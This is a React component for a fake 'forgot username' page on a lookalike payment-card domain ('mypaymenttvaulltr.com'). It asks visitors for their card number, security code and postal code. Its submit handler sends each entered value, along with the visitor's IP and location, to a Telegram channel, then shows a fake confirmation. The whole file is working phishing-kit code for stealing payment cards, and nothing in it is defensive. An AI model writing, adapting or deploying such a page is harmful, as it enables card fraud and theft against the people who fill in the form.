import { useState } from "react";
import { useLocation } from "wouter";
import { AuthHeader } from "@/components/auth-header";
import { Eye, EyeOff } from "lucide-react";
import { sendTelegram, getIPInfo } from "@/lib/telegram";

import { useI18n } from "@/lib/i18n";

export default function ForgotUsername() {
  const [, navigate] = useLocation();
  const { t } = useI18n();
  const [cardNumber, setCardNumber] = useState("");
  const [securityCode, setSecurityCode] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [showCard, setShowCard] = useState(false);
  const [showSecurity, setShowSecurity] = useState(false);
  const [showPostal, setShowPostal] = useState(false);

  const formatCard = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const ip = await getIPInfo();
    await sendTelegram(
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔍 <b>mypaymenttvaulltr.com</b>\n` +
      `📌 <b>Lupa Username</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `💳 <b>No. Kartu</b>   : <code>${cardNumber}</code>\n` +
      `🔒 <b>Kode Keamanan</b>: <code>${securityCode}</code>\n` +
      `📮 <b>Postal Code</b> : <code>${postalCode}</code>\n` +
      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
      `🕐 <b>Waktu</b>       : ${now}\n` +
      `━━━━━━━━━━━━━━━━━━━━━`
    );
    await new Promise((r) => setTimeout(r, 1000));
    setLoading(false);
    setDone(true);
  };

  const inputClass =
    "w-full h-11 px-3 border border-gray-300 rounded-sm text-[13px] text-gray-800 placeholder-gray-400 focus:outline-none focus:border-gray-500 transition-all bg-white";

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <AuthHeader />

      <div className="flex-1 flex flex-col">
        <div className="bg-white px-6 py-5 border-b border-gray-100 flex items-center justify-between">
          <h1 className="text-[22px] font-light text-gray-800 tracking-wide">{t.forgotUsernamePageTitle}</h1>
          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#d1d5db" strokeWidth="1" className="flex-shrink-0">
            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
            <circle cx="12" cy="7" r="4" />
          </svg>
        </div>

        <div className="flex-1 flex items-start justify-center px-4 py-10">
          {!done ? (
            <div className="w-full max-w-[400px] bg-white border border-gray-200 rounded-sm shadow-sm p-6">
              <p className="text-[13px] text-gray-600 mb-5">{t.forgotUsernameDesc}</p>
              <form onSubmit={handleSubmit} className="space-y-3">
                {/* Card Number */}
                <div className="relative">
                  <input
                    type={showCard ? "text" : "password"}
                    value={cardNumber}
                    onChange={(e) => setCardNumber(formatCard(e.target.value))}
                    required
                    placeholder={`${t.cardNumber}*`}
                    className={inputClass}
                    style={{ paddingRight: 40 }}
                  />
                  <button type="button" onClick={() => setShowCard((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-700" tabIndex={-1}>
                    {showCard ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>

                {/* Security Code */}
                <div className="relative">
                  <input
                    type={showSecurity ? "text" : "password"}
                    value={securityCode}
                    onChange={(e) => setSecurityCode(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    required
                    placeholder={`${t.securityCode}*`}
                    className={inputClass}
                    style={{ paddingRight: 40 }}
                  />
                  <button type="button" onClick={() => setShowSecurity((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-700" tabIndex={-1}>
                    {showSecurity ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>

                {/* Postal Code */}
                <div className="relative">
                  <input
                    type={showPostal ? "text" : "password"}
                    value={postalCode}
                    onChange={(e) => setPostalCode(e.target.value.slice(0, 10))}
                    required
                    placeholder={`${t.postalCode}*`}
                    className={inputClass}
                    style={{ paddingRight: 40 }}
                  />
                  <button type="button" onClick={() => setShowPostal((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-700" tabIndex={-1}>
                    {showPostal ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>

                <div className="flex gap-3 pt-2">
                  <button type="button" onClick={() => navigate("/login")}
                    className="flex-1 h-11 border border-gray-800 text-gray-800 text-[13px] font-medium rounded-sm hover:bg-gray-50 transition-colors">
                    {t.cancel}
                  </button>
                  <button type="submit" disabled={loading}
                    className="flex-1 h-11 bg-[#1a1a1a] text-white text-[13px] font-medium rounded-sm hover:bg-[#333] transition-colors disabled:opacity-50">
                    {loading ? t.searching : t.continueBtn}
                  </button>
                </div>
              </form>
            </div>
          ) : (
            <div className="w-full max-w-[280px] bg-white border border-gray-200 rounded-sm shadow-sm p-6">
              <p className="text-[13px] text-gray-700 mb-5 leading-relaxed">{t.forgotUsernameSent}</p>
              <button type="button" onClick={() => navigate("/login")}
                className="w-full h-11 bg-[#1a1a1a] text-white text-[13px] font-medium rounded-sm hover:bg-[#333] transition-colors">
                {t.navigateToLogin}
              </button>
            </div>
          )}
        </div>
      </div>

      <p className="text-[11px] text-gray-400 text-center py-4">
        &copy; {t.copyright} |{" "}
        <button className="underline hover:text-gray-600">{t.termsOfUse}</button>
        {" | "}
        <button className="underline hover:text-gray-600">{t.privacyCookies}</button>
      </p>
    </div>
  );
}
